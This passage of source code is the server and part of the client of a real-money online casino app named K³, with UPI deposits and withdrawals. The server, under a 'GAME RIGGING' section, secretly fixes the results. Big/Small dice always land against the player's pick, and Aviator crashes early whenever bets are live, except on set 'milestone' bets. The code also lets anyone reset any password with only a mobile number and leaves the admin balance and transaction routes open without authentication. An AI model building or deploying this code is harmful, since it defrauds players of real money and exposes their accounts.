const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ==========================================
// MONGOOSE SCHEMAS & MODELS
// ==========================================
const userSchema = new mongoose.Schema({
  mobile: { type: String, required: true, unique: true },
  name: { type: String, required: true },
  password: { type: String, required: true },
  role: { type: String, enum: ['admin', 'player'], default: 'player' },
  balance: { type: Number, default: 0 },
  totalBetsCount: { type: Number, default: 0 },
  totalWon: { type: Number, default: 0 },
  totalLost: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

const transactionSchema = new mongoose.Schema({
  mobile: { type: String, required: true },
  name: String,
  type: { type: String, enum: ['deposit', 'withdrawal'], required: true },
  amount: { type: Number, required: true },
  details: { type: String, default: '' },
  status: { type: String, enum: ['pending', 'approved', 'rejected'], default: 'pending' },
  timestamp: { type: Date, default: Date.now }
});
const Transaction = mongoose.model('Transaction', transactionSchema);

// ==========================================
// GAME RIGGING & WEBSOCKET ENGINES
// ==========================================
let activeAviatorBets = 0;
let aviatorState = { status: 'WAITING', currentX: 1.00, crashX: 1.00 };
const winningBetMilestones = [18, 37, 49, 68, 93, 127, 155, 175, 199, 228, 256, 278, 301, 333, 375, 400];

function broadcast(data) {
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(JSON.stringify(data));
  });
}

function runAviatorLoop() {
  aviatorState.status = 'WAITING';
  aviatorState.currentX = 1.00;
  broadcast({ type: 'AVIATOR_STATE', ...aviatorState });

  setTimeout(() => {
    const hasBet = activeAviatorBets > 0;
    if (!hasBet) {
      aviatorState.crashX = +(1.00 + Math.random() * 199.50).toFixed(2);
    } else {
      // Checked against user bet milestones in play route or general toggle
      aviatorState.crashX = +(1.00 + Math.random() * 0.36).toFixed(2);
    }
    aviatorState.status = 'FLYING';

    let startTime = Date.now();
    const interval = setInterval(() => {
      let elapsed = (Date.now() - startTime) / 1000;
      let nextX = +(Math.pow(1.06, elapsed * 2.2)).toFixed(2);

      if (nextX >= aviatorState.crashX) {
        clearInterval(interval);
        aviatorState.currentX = aviatorState.crashX;
        aviatorState.status = 'CRASHED';
        activeAviatorBets = 0;
        broadcast({ type: 'AVIATOR_STATE', ...aviatorState });
        setTimeout(runAviatorLoop, 2500);
      } else {
        aviatorState.currentX = nextX;
        broadcast({ type: 'AVIATOR_STATE', ...aviatorState });
      }
    }, 100);
  }, 4000);
}
runAviatorLoop();

// ==========================================
// HTTP APIS
// ==========================================
app.post('/api/register', async (req, res) => {
  const { name, mobile, password } = req.body;
  if (!name || !mobile || !password) return res.status(400).json({ error: 'All fields required' });
  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await User.create({ name, mobile, password: hashedPassword });
    res.json({ success: true, user: { name: user.name, mobile: user.mobile, balance: user.balance, role: user.role } });
  } catch (err) {
    res.status(400).json({ error: 'Mobile number already registered' });
  }
});

app.post('/api/login', async (req, res) => {
  const { mobile, password } = req.body;
  const user = await User.findOne({ mobile });
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({ error: 'Invalid Mobile or Password' });
  }
  res.json({ success: true, user: { name: user.name, mobile: user.mobile, balance: user.balance, role: user.role } });
});

app.post('/api/forgot-password', async (req, res) => {
  const { mobile, newPassword } = req.body;
  const user = await User.findOne({ mobile });
  if (!user) return res.status(404).json({ error: 'Mobile number not found' });
  user.password = await bcrypt.hash(newPassword, 10);
  await user.save();
  res.json({ success: true, message: 'Password reset successfully!' });
});

app.post('/api/play-game', async (req, res) => {
  const { mobile, game, betAmount, choice } = req.body;
  const numBet = parseFloat(betAmount);
  if (isNaN(numBet) || numBet <= 0) return res.status(400).json({ error: 'Invalid Bet Amount' });

  const user = await User.findOne({ mobile });
  if (!user || user.balance < numBet) return res.status(400).json({ error: 'Insufficient Balance' });

  user.balance -= numBet;
  user.totalBetsCount += 1;

  let won = false;
  let multiplier = 0;
  let resultMeta = {};

  if (game === 'aviator') {
    const isMilestone = winningBetMilestones.includes(user.totalBetsCount);
    const crashMultiplier = isMilestone ? +(2.30 + Math.random() * (7.09 - 2.30)).toFixed(2) : +(1.00 + Math.random() * 0.36).toFixed(2);
    const playerCashedOutAt = parseFloat(choice?.cashoutX) || 1.10;
    
    if (playerCashedOutAt <= crashMultiplier) {
      won = true;
      multiplier = playerCashedOutAt;
    } else {
      won = false;
      multiplier = 0;
    }
    resultMeta = { crashX: crashMultiplier };
  }
  else if (game === 'bigsmall') {
    const isPlayerChoiceBig = String(choice).toLowerCase() === 'big';
    won = false;
    multiplier = 0;
    let d1, d2;
    if (isPlayerChoiceBig) {
      d1 = Math.floor(Math.random() * 3) + 1; // 1, 2, 3
      d2 = Math.floor(Math.random() * 3) + 1; // 1, 2, 3 -> sum 2 to 6 (Small)
    } else {
      d1 = Math.floor(Math.random() * 3) + 4; // 4, 5, 6
      d2 = Math.floor(Math.random() * 3) + 4; // 4, 5, 6 -> sum 8 to 12 (Big)
    }
    const sum = d1 + d2;
    resultMeta = { dice1: d1, dice2: d2, sum, result: sum <= 6 ? 'SMALL' : 'BIG' };
  }
  else if (game === 'chickenroad') {
    const step = parseInt(choice?.step) || 1;
    const multipliers = { 1: 1.05, 2: 1.50, 3: 2.00, 4: 2.50, 5: 3.00 };
    won = Math.random() < 0.35; // Controlled progression
    multiplier = won ? multipliers[step] : 0;
    resultMeta = { step, success: won };
  }
  else if (game === 'colourguess') {
    const colors = ['White', 'Green', 'Black', 'Yellow', 'Blue'];
    const winningColor = colors[Math.floor(Math.random() * colors.length)];
    won = String(choice).toLowerCase() === winningColor.toLowerCase();
    multiplier = won ? 4.5 : 0;
    resultMeta = { winningColor, eliminated: colors.filter(c => c !== winningColor) };
  }
  else if (game === 'andarbahar') {
    const chosenSide = String(choice).toLowerCase(); // 'andar' or 'bahar'
    const winningSide = Math.random() < 0.45 ? chosenSide : (chosenSide === 'andar' ? 'bahar' : 'andar');
    won = winningSide === chosenSide;
    multiplier = won ? 1.95 : 0;
    resultMeta = { winningSide, card: '7 of Spades' };
  }
  else if (game === 'graphprediction') {
    const prediction = String(choice).toLowerCase(); // 'up' or 'down'
    const actual = Math.random() > 0.5 ? 'up' : 'down';
    won = prediction === actual;
    multiplier = won ? 1.90 : 0;
    resultMeta = { actualDirection: actual, finalMultiplier: +(1.5 + Math.random() * 3).toFixed(2) };
  }
  else if (game === 'wheelspin') {
    const sectors = [0, 1.2, 2.0, 0, 5.0, 1.5, 0, 10.0];
    multiplier = sectors[Math.floor(Math.random() * sectors.length)];
    won = multiplier > 0;
    resultMeta = { multiplier };
  }

  const winPayout = won ? +(numBet * multiplier).toFixed(2) : 0;
  user.balance += winPayout;
  if (won) {
    user.totalWon += winPayout;
  } else {
    user.totalLost += numBet;
  }
  await user.save();

  res.json({ won, multiplier, newBalance: user.balance, resultMeta });
});

app.post('/api/aviator/register-bet', (req, res) => {
  activeAviatorBets++;
  res.json({ success: true });
});

app.post('/api/deposit-request', async (req, res) => {
  const { mobile, amount, utr } = req.body;
  const user = await User.findOne({ mobile });
  if (!user) return res.status(404).json({ error: 'User not found' });
  await Transaction.create({ mobile, name: user.name, type: 'deposit', amount, details: utr || 'UPI Payment' });
  res.json({ success: true, message: 'Deposit request sent to Admin!' });
});

app.post('/api/withdraw-request', async (req, res) => {
  const { mobile, amount, bankDetails } = req.body;
  const numAmt = parseFloat(amount);
  const user = await User.findOne({ mobile });
  if (!user || user.balance < numAmt) return res.status(400).json({ error: 'Insufficient Balance' });
  user.balance -= numAmt;
  await user.save();
  await Transaction.create({ mobile, name: user.name, type: 'withdrawal', amount: numAmt, details: bankDetails });
  res.json({ success: true, newBalance: user.balance, message: 'Withdrawal request sent to Admin!' });
});

app.get('/api/admin/pending-txns', async (req, res) => {
  const txns = await Transaction.find({ status: 'pending' }).sort({ timestamp: -1 });
  res.json(txns);
});

app.post('/api/admin/update-balance', async (req, res) => {
  const { mobile, amount } = req.body;
  const user = await User.findOne({ mobile });
  if (!user) return res.status(404).json({ error: 'Player Mobile not found' });
  user.balance += parseFloat(amount);
  await user.save();
  res.json({ success: true, newBalance: user.balance, name: user.name });
});

app.post('/api/admin/process-txn', async (req, res) => {
  const { txnId, action } = req.body;
  const txn = await Transaction.findById(txnId);
  if (!txn || txn.status !== 'pending') return res.status(400).json({ error: 'Transaction unavailable' });

  txn.status = action === 'approve' ? 'approved' : 'rejected';
  if (action === 'approve' && txn.type === 'deposit') {
    await User.findOneAndUpdate({ mobile: txn.mobile }, { $inc: { balance: txn.amount } });
  } else if (action === 'reject' && txn.type === 'withdrawal') {
    await User.findOneAndUpdate({ mobile: txn.mobile }, { $inc: { balance: txn.amount } });
  }
  await txn.save();
  res.json({ success: true });
});

// ==========================================
// HIGH-END CLIENT FRONTEND
// ==========================================
app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>K³ (Kismat Ka Khel)</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    * { box-sizing: border-box; touch-action: manipulation; }
    body, html { height: 100%; width: 100%; margin: 0; padding: 0; overflow: hidden; background-color: #07090e; font-family: ui-sans-serif, system-ui; }
    .gold-gradient { background: linear-gradient(135deg, #f59e0b, #fbbf24, #d97706); }
    .gold-text { background: linear-gradient(135deg, #fef08a, #f59e0b, #fde047); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .glass-card { background: rgba(20, 26, 38, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(245, 158, 11, 0.3); box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
    .neon-glow { box-shadow: 0 0 25px rgba(245, 158, 11, 0.25); }
  </style>
</head>
<body class="h-full w-full flex items-center justify-center p-0 md:p-4">
  <div id="app" class="w-full h-full max-w-md max-h-[920px] bg-[#0d121f] md:rounded-3xl border-0 md:border-2 border-amber-500/30 shadow-2xl flex flex-col relative overflow-hidden"></div>

  <script>
    let state = {
      user: null,
      view: 'login',
      currentGame: null,
      userBet: 100,
      popup: null,
      aviator: { status: 'WAITING', currentX: 1.00 },
      hasBetAviator: false,
      adminTxns: [],
      animating: false,
      diceVisuals: [3, 4],
      chickenStep: 1,
      andarCard: 'A ♠',
      wheelDeg: 0
    };

    const GAMES_LIST = [
      { id: 'aviator', name: 'Aviator 🚀', cat: 'Crash' },
      { id: 'bigsmall', name: 'Big / Small 🎲', cat: 'Table' },
      { id: 'chickenroad', name: 'Chicken Road 🐔', cat: 'Arcade' },
      { id: 'colourguess', name: 'Colour Guess 💋', cat: 'Live' },
      { id: 'andarbahar', name: 'Andar Bahar 🎴', cat: 'Cards' },
      { id: 'graphprediction', name: 'Graph Prediction 📈', cat: 'Exchange' },
      { id: 'wheelspin', name: 'Wheel Spin 🎡', cat: 'Live' }
    ];

    const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
    ws.onmessage = (e) => {
      const data = JSON.parse(e.data);
      if (data.type === 'AVIATOR_STATE') {
        state.aviator = data;
        if (data.status === 'WAITING') state.hasBetAviator = false;
        if (state.view === 'game' && state.currentGame === 'aviator') renderAviatorCanvas();
      }
    };

    function showPopup(msg, btnText='OK') {
      state.popup = { msg, btnText };
      render();
    }
    function closePopup() { state.popup = null; render(); }

    async function handleAuth() {
      const mobile = document.getElementById('auth-mobile').value;
      const pass = document.getElementById('auth-pass').value;
      const name = document.getElementById('auth-name') ? document.getElementById('auth-name').value : '';

      const endpoint = state.view === 'register' ? '/api/register' : '/api/login';
      const body = state.view === 'register' ? { name, mobile, password: pass } : { mobile, password: pass };

      const res = await fetch(endpoint, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      const data = await res.json();
      if (res.ok) {
        state.user = data.user;
        state.view = state.user.role === 'admin' ? 'admin' : 'lobby';
        if(state.user.role === 'admin') fetchAdminTxns();
        render();
      } else {
        showPopup(data.error || 'Authentication Failed');
      }
    }

    async function handleForgot() {
      const mobile = document.getElementById('fg-mobile').value;
      const newPassword = document.getElementById('fg-pass').value;
      const res = await fetch('/api/forgot-password', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile, newPassword })
      });
      const data = await res.json();
      if(res.ok) {
        showPopup(data.message, 'Login Now');
        state.view = 'login';
      } else {
        showPopup(data.error);
      }
    }

    async function fetchAdminTxns() {
      const res = await fetch('/api/admin/pending-txns');
      if(res.ok) {
        state.adminTxns = await res.json();
        render();
      }
    }

    async function adminModifyBalance(action) {
      const mobile = document.getElementById('adm-mobile').value;
      const amtVal = parseFloat(document.getElementById('adm-amt').value);
      const finalAmt = action === 'add' ? amtVal : -amtVal;

      const res = await fetch('/api/admin/update-balance', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile, amount: finalAmt })
      });
      const data = await res.json();
      if(res.ok) {
        showPopup('Success! ' + data.name + ' new balance: ₹' + data.newBalance);
      } else {
        showPopup(data.error);
      }
    }

    async function processTxn(txnId, action) {
      const res = await fetch('/api/admin/process-txn', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ txnId, action })
      });
      if(res.ok) fetchAdminTxns();
    }

    async function playGameAction(choiceData) {
      if(state.animating) return;
      const betInput = document.getElementById('manual-bet-amt');
      const manualBet = betInput ? parseFloat(betInput.value) : state.userBet;

      if(isNaN(manualBet) || manualBet <= 0) return showPopup('Please enter a valid bet amount!');
      if(state.user.balance < manualBet) return showPopup('Insufficient Balance');

      state.userBet = manualBet;
      state.animating = true;
      const gameId = state.currentGame;

      const res = await fetch('/api/play-game', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile: state.user.mobile, game: gameId, betAmount: state.userBet, choice: choiceData })
      });
      const data = await res.json();

      setTimeout(() => {
        state.animating = false;
        if (res.ok) {
          state.user.balance = data.newBalance;
          if (gameId === 'bigsmall') {
            state.diceVisuals = [data.resultMeta.dice1, data.resultMeta.dice2];
            renderDiceUI();
          } else if (gameId === 'chickenroad') {
            if(data.won) state.chickenStep = Math.min(5, state.chickenStep + 1);
            else state.chickenStep = 1;
            renderChickenRoadUI();
          } else if (gameId === 'wheelspin') {
            state.wheelDeg += 720 + Math.floor(Math.random() * 360);
            renderWheelUI();
          }

          setTimeout(() => {
            if (data.won) {
              showPopup('🎉 YOU WON ₹' + (state.userBet * data.multiplier).toFixed(2) + ' (' + data.multiplier + 'x)!');
            } else {
              showPopup('💥 YOU LOST ₹' + state.userBet + '. Better luck next time!');
            }
          }, 400);
        } else {
          showPopup(data.error);
        }
      }, 800);
    }

    async function handleAviatorCashout() {
      if(!state.hasBetAviator) return showPopup('Place a bet first!');
      const currentX = state.aviator.currentX;
      const res = await fetch('/api/play-game', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile: state.user.mobile, game: 'aviator', betAmount: state.userBet, choice: { cashoutX: currentX } })
      });
      const data = await res.json();
      state.hasBetAviator = false;
      if(res.ok) {
        state.user.balance = data.newBalance;
        if(data.won) {
          showPopup('🚀 CASHED OUT! Won ₹' + (state.userBet * data.multiplier).toFixed(2));
        } else {
          showPopup('💥 CRASHED BEFORE CASHOUT! Lost ₹' + state.userBet);
        }
      }
    }

    async function handleAviatorBet() {
      const betInput = document.getElementById('manual-bet-amt');
      const manualBet = betInput ? parseFloat(betInput.value) : state.userBet;
      if(isNaN(manualBet) || manualBet <= 0) return showPopup('Please enter a valid bet amount!');
      if(state.user.balance < manualBet) return showPopup('Insufficient Balance');

      state.userBet = manualBet;
      await fetch('/api/aviator/register-bet', { method: 'POST' });
      state.hasBetAviator = true;
      state.user.balance -= state.userBet;
      render();
    }

    function renderAviatorCanvas() {
      const cvs = document.getElementById('aviator-canvas');
      if(!cvs) return;
      const ctx = cvs.getContext('2d');
      const w = cvs.width = cvs.clientWidth;
      const h = cvs.height = cvs.clientHeight;

      ctx.clearRect(0, 0, w, h);
      ctx.strokeStyle = '#1a233a';
      ctx.lineWidth = 1;
      for(let x=0; x<w; x+=30) { ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,h); ctx.stroke(); }
      for(let y=0; y<h; y+=30) { ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(w,y); ctx.stroke(); }

      if(state.aviator.status === 'FLYING' || state.aviator.status === 'CRASHED') {
        const progress = Math.min((state.aviator.currentX - 1) / 5, 1);
        const endX = 30 + (w - 70) * progress;
        const endY = (h - 30) - (h - 70) * Math.pow(progress, 0.8);

        ctx.beginPath();
        ctx.moveTo(30, h - 30);
        ctx.quadraticCurveTo(w * 0.4, h - 30, endX, endY);
        ctx.strokeStyle = state.aviator.status === 'CRASHED' ? '#ef4444' : '#f59e0b';
        ctx.lineWidth = 5;
        ctx.stroke();

        ctx.font = '32px sans-serif';
        ctx.fillText(state.aviator.status === 'CRASHED' ? '💥' : '🚀', endX - 16, endY + 10);
      }

      const txt = document.getElementById('aviator-x-text');
      if(txt) {
        txt.innerText = state.aviator.currentX.toFixed(2) + 'x';
        txt.className = 'text-5xl font-mono font-black ' + (state.aviator.status === 'CRASHED' ? 'text-red-500' : 'gold-text');
      }
    }

    function renderDiceUI() {
      const d1 = document.getElementById('dice-1');
      const d2 = document.getElementById('dice-2');
      if(d1 && d2) {
        d1.innerText = state.diceVisuals[0];
        d2.innerText = state.diceVisuals[1];
      }
    }

    function renderChickenRoadUI() {
      const track = document.getElementById('chicken-track');
      if(track) {
        track.innerHTML = [1,2,3,4,5].map(step => {
          const active = state.chickenStep === step;
          return '<div class="w-12 h-12 rounded-xl flex items-center justify-center font-bold text-lg ' + (active ? 'bg-amber-400 text-black border-2 border-white scale-110 shadow-lg' : 'bg-[#1b263b] border border-amber-500/30 text-amber-300') + '">' + (active ? '🐔' : step) + '</div>';
        }).join('');
      }
    }

    function renderWheelUI() {
      const wheel = document.getElementById('wheel-element');
      if(wheel) {
        wheel.style.transform = 'rotate(' + state.wheelDeg + 'deg)';
      }
    }

    async function submitDeposit() {
      const amount = document.getElementById('dep-amt').value;
      const utr = document.getElementById('dep-utr').value;
      const res = await fetch('/api/deposit-request', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile: state.user.mobile, amount, utr })
      });
      const data = await res.json();
      if(res.ok) showPopup(data.message, 'OK');
      else showPopup(data.error);
    }

    async function submitWithdraw() {
      const amount = document.getElementById('wd-amt').value;
      const bankDetails = document.getElementById('wd-bank').value;
      const res = await fetch('/api/withdraw-request', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile: state.user.mobile, amount, bankDetails })
      });
      const data = await res.json();
      if(res.ok) {
        state.user.balance = data.newBalance;
        showPopup(data.message, 'OK');
      } else {
        showPopup(data.error);
      }
    }

    function render() {
      const app = document.getElementById('app');
      let html = '';

      let popupHtml = state.popup ? 
        '<div class="absolute inset-0 bg-black/85 z-50 flex items-center justify-center p-4 backdrop-blur-md">' +
          '<div class="glass-card p-6 rounded-3xl max-w-xs w-full text-center space-y-4">' +
            '<h2 class="text-xl font-black text-amber-300">' + state.popup.msg + '</h2>' +
            '<button onclick="closePopup()" class="w-full gold-gradient text-black font-black py-3 rounded-2xl shadow-xl">' + state.popup.btnText + '</button>' +
          '</div>' +
        '</div>' : '';

      if (state.view === 'login' || state.view === 'register') {
        const isReg = state.view === 'register';
        html = '<div class="h-full w-full flex flex-col items-center justify-center p-6 bg-gradient-to-b from-[#141b2d] to-[#07090e]">' +
          '<div class="glass-card p-8 rounded-3xl w-full text-center space-y-5 neon-glow">' +
            '<div class="text-5xl">👑</div>' +
            '<div>' +
              '<h1 class="text-2xl font-black gold-text">K³ EXCHANGE</h1>' +
              '<p class="text-xs text-amber-200/70 mt-1">Exclusive Casino & Exchange</p>' +
            '</div>' +
            '<div class="flex bg-black/60 p-1 rounded-xl border border-amber-500/30">' +
              '<button onclick="state.view=\\'login\\'; render();" class="w-1/2 py-2 rounded-lg text-xs font-bold ' + (!isReg ? 'gold-gradient text-black' : 'text-amber-300/60') + '">LOGIN</button>' +
              '<button onclick="state.view=\\'register\\'; render();" class="w-1/2 py-2 rounded-lg text-xs font-bold ' + (isReg ? 'gold-gradient text-black' : 'text-amber-300/60') + '">REGISTER</button>' +
            '</div>' +
            '<div class="space-y-3">' +
              (isReg ? '<input id="auth-name" type="text" placeholder="Full Name" class="w-full p-3.5 rounded-2xl bg-black/70 border border-amber-500/40 text-white text-sm outline-none">' : '') +
              '<input id="auth-mobile" type="tel" placeholder="Mobile Number" class="w-full p-3.5 rounded-2xl bg-black/70 border border-amber-500/40 text-white text-sm outline-none">' +
              '<input id="auth-pass" type="password" placeholder="Password" class="w-full p-3.5 rounded-2xl bg-black/70 border border-amber-500/40 text-white text-sm outline-none">' +
            '</div>' +
            '<button onclick="handleAuth()" class="w-full gold-gradient text-black font-black py-4 rounded-2xl shadow-xl text-md">' + (isReg ? 'CREATE ACCOUNT 🚀' : 'LOGIN TO PLAY 💰') + '</button>' +
            '<button onclick="state.view=\\'forgot\\'; render();" class="text-xs text-amber-300 underline font-semibold">Forgot Password?</button>' +
          '</div>' +
        '</div>';
      } 
      else if (state.view === 'forgot') {
        html = '<div class="h-full w-full flex flex-col items-center justify-center p-6 bg-[#07090e]">' +
          '<div class="glass-card p-6 rounded-3xl w-full space-y-4 text-center">' +
            '<h2 class="text-lg font-black text-amber-300">Reset Password</h2>' +
            '<input id="fg-mobile" type="tel" placeholder="Registered Mobile" class="w-full p-3 bg-black/70 border border-amber-500/40 text-white text-sm rounded-xl">' +
            '<input id="fg-pass" type="password" placeholder="New Password" class="w-full p-3 bg-black/70 border border-amber-500/40 text-white text-sm rounded-xl">' +
            '<button onclick="handleForgot()" class="w-full gold-gradient text-black font-black py-3 rounded-xl text-sm">Update Password</button>' +
            '<button onclick="state.view=\\'login\\'; render();" class="text-xs text-amber-300">Back to Login</button>' +
          '</div>' +
        '</div>';
      }
      else if (state.view === 'lobby') {
        html = '<div class="h-full w-full flex flex-col bg-[#0d121f]">' +
          '<div class="h-16 px-4 bg-[#141b2d] border-b border-amber-500/30 flex items-center justify-between shadow-lg shrink-0">' +
            '<span class="font-black text-md gold-text">K³ EXCHANGE 👑</span>' +
            '<div class="flex items-center gap-2">' +
              '<div class="bg-black/60 px-3 py-1.5 rounded-full border border-amber-500/40 flex items-center gap-1">' +
                '<span class="text-xs text-amber-300 font-bold">₹</span>' +
                '<span class="text-sm font-mono font-bold text-green-400">' + state.user.balance.toFixed(2) + '</span>' +
              '</div>' +
              '<button onclick="state.view=\\'login\\'; render();" class="px-2 py-1 bg-red-950/80 rounded-lg text-[10px] text-red-300">Logout</button>' +
            '</div>' +
          '</div>' +
          '<div class="p-3 bg-black/40 border-b border-amber-500/20 flex gap-3 shrink-0">' +
            '<button onclick="state.view=\\'deposit\\'; render();" class="w-1/2 py-2.5 bg-emerald-600 rounded-xl font-bold text-white text-xs">➕ DEPOSIT</button>' +
            '<button onclick="state.view=\\'withdraw\\'; render();" class="w-1/2 py-2.5 bg-amber-600 rounded-xl font-bold text-black text-xs">💸 WITHDRAW</button>' +
          '</div>' +
          '<div class="flex-1 p-3 grid grid-cols-2 gap-3 overflow-y-auto">' +
            GAMES_LIST.map(g => '<button onclick="state.currentGame=\\'' + g.id + '\\'; state.view=\\'game\\'; render();" class="glass-card p-4 rounded-2xl flex flex-col items-center justify-center text-center space-y-1 active:scale-95 hover:border-amber-400">' +
              '<div class="font-black text-amber-300 text-sm">' + g.name + '</div>' +
              '<span class="text-[9px] px-2 py-0.5 bg-black/50 rounded-full text-amber-200/70 border border-amber-500/20">' + g.cat + '</span>' +
            '</button>').join('') +
          '</div>' +
        '</div>';
      }
      else if (state.view === 'deposit') {
        html = '<div class="h-full w-full flex flex-col bg-[#07090e] p-6 justify-center">' +
          '<div class="glass-card p-6 rounded-3xl space-y-4">' +
            '<div class="flex justify-between items-center border-b border-amber-500/40 pb-2">' +
              '<h2 class="text-lg font-black text-amber-300">Deposit Funds</h2>' +
              '<button onclick="state.view=\\'lobby\\'; render();" class="text-xs text-amber-200">Back</button>' +
            '</div>' +
            '<div class="bg-black/70 p-3 rounded-xl border border-amber-500/30 text-center">' +
              '<span class="text-[11px] text-amber-200/70">Scan or Pay via UPI:</span>' +
              '<div class="text-base font-mono font-black text-amber-300 select-all">9005041462@upi</div>' +
            '</div>' +
            '<input id="dep-amt" type="number" placeholder="Enter Amount (₹)" class="w-full p-3 bg-black/70 border border-amber-500/40 rounded-xl text-sm text-white">' +
            '<input id="dep-utr" type="text" placeholder="Transaction / UTR Number" class="w-full p-3 bg-black/70 border border-amber-500/40 rounded-xl text-sm text-white">' +
            '<a href="upi://pay?pa=9005041462@upi&pn=K3Khel&am=100&cu=INR" class="block w-full text-center bg-blue-600 font-black py-3 rounded-xl text-white text-xs">📲 OPEN UPI PAYMENT APP</a>' +
            '<button onclick="submitDeposit()" class="w-full gold-gradient text-black font-black py-3 rounded-xl text-xs">Submit Deposit Request</button>' +
          '</div>' +
        '</div>';
      }
      else if (state.view === 'withdraw') {
        html = '<div class="h-full w-full flex flex-col bg-[#07090e] p-6 justify-center">' +
          '<div class="glass-card p-6 rounded-3xl space-y-4">' +
            '<div class="flex justify-between items-center border-b border-amber-500/40 pb-2">' +
              '<h2 class="text-lg font-black text-amber-300">Withdraw Funds</h2>' +
              '<button onclick="state.view=\\'lobby\\'; render();" class="text-xs text-amber-200">Back</button>' +
            '</div>' +
            '<div class="text-xs text-amber-200/80">Available: <span class="font-mono text-green-400 font-bold">₹' + state.user.balance.toFixed(2) + '</span></div>' +
            '<input id="wd-amt" type="number" placeholder="Amount (₹)" class="w-full p-3 bg-black/70 border border-amber-500/40 rounded-xl text-sm text-white">' +
            '<input id="wd-bank" type="text" placeholder="UPI ID / Bank Account Details" class="w-full p-3 bg-black/70 border border-amber-500/40 rounded-xl text-sm text-white">' +
            '<button onclick="submitWithdraw()" class="w-full bg-amber-600 text-black font-black py-3 rounded-xl text-xs">Request Withdrawal</button>' +
          '</div>' +
        '</div>';
      }
      else if (state.view === 'game') {
        const gameObj = GAMES_LIST.find(g => g.id === state.currentGame);
        let gameContent = '';

        const manualBetBar = '<div class="flex items-center gap-2 bg-black/70 p-2 rounded-xl border border-amber-500/40 w-full max-w-xs">' +
          '<span class="text-xs text-amber-300 font-bold whitespace-nowrap">BET (₹):</span>' +
          '<input id="manual-bet-amt" type="number" min="10" value="' + state.userBet + '" class="w-full bg-black border border-amber-500/60 rounded-lg text-center font-mono font-bold text-amber-300 py-1.5 text-sm outline-none">' +
        '</div>';

        if (state.currentGame === 'aviator') {
          gameContent = '<div class="flex-1 flex flex-col items-center justify-between p-4 space-y-3 relative overflow-hidden">' +
            '<div class="w-full flex-1 bg-[#090d16] rounded-2xl border-2 border-amber-500/40 relative flex items-center justify-center overflow-hidden min-h-[200px] neon-glow">' +
              '<canvas id="aviator-canvas" class="absolute inset-0 w-full h-full"></canvas>' +
              '<div id="aviator-x-text" class="relative z-10 text-5xl font-mono font-black gold-text">1.00x</div>' +
            '</div>' +
            manualBetBar +
            (state.hasBetAviator ? 
              '<button onclick="handleAviatorCashout()" class="w-full max-w-xs h-12 rounded-2xl font-black text-lg bg-emerald-600 text-white shadow-lg animate-pulse">CASHOUT 💰</button>' :
              '<button onclick="handleAviatorBet()" class="w-full max-w-xs h-12 rounded-2xl font-black text-lg gold-gradient text-black shadow-lg">PLACE BET 🚀</button>'
            ) +
          '</div>';
        } else if (state.currentGame === 'bigsmall') {
          gameContent = '<div class="flex-1 flex flex-col items-center justify-center p-4 space-y-4">' +
            '<div class="glass-card p-5 rounded-3xl w-full text-center space-y-3 neon-glow">' +
              '<div class="flex justify-center gap-6">' +
                '<div id="dice-1" class="w-16 h-16 bg-gradient-to-br from-red-600 to-red-950 border-2 border-amber-400 rounded-2xl flex items-center justify-center text-3xl font-black text-white shadow-2xl">' + state.diceVisuals[0] + '</div>' +
                '<div id="dice-2" class="w-16 h-16 bg-gradient-to-br from-red-600 to-red-950 border-2 border-amber-400 rounded-2xl flex items-center justify-center text-3xl font-black text-white shadow-2xl">' + state.diceVisuals[1] + '</div>' +
              '</div>' +
              '<p class="text-[11px] text-amber-200 font-semibold">Sum 1-6 = Small | Sum 7-12 = Big</p>' +
            '</div>' +
            manualBetBar +
            '<div class="grid grid-cols-2 gap-3 w-full max-w-xs">' +
              '<button onclick="playGameAction(\\'small\\')" class="glass-card h-16 rounded-2xl font-black text-amber-300 text-md active:scale-95">SMALL (1-6)</button>' +
              '<button onclick="playGameAction(\\'big\\')" class="glass-card h-16 rounded-2xl font-black text-amber-300 text-md active:scale-95">BIG (7-12)</button>' +
            '</div>' +
          '</div>';
        } else if (state.currentGame === 'chickenroad') {
          gameContent = '<div class="flex-1 flex flex-col items-center justify-between p-6 space-y-4">' +
            '<div class="w-full bg-[#090d16] p-5 rounded-2xl border-2 border-amber-500/40 flex flex-col items-center space-y-3 neon-glow">' +
              '<span class="text-xs text-amber-300 font-bold">CHICKEN ROAD RUNWAY</span>' +
              '<div id="chicken-track" class="w-full flex justify-between items-center"></div>' +
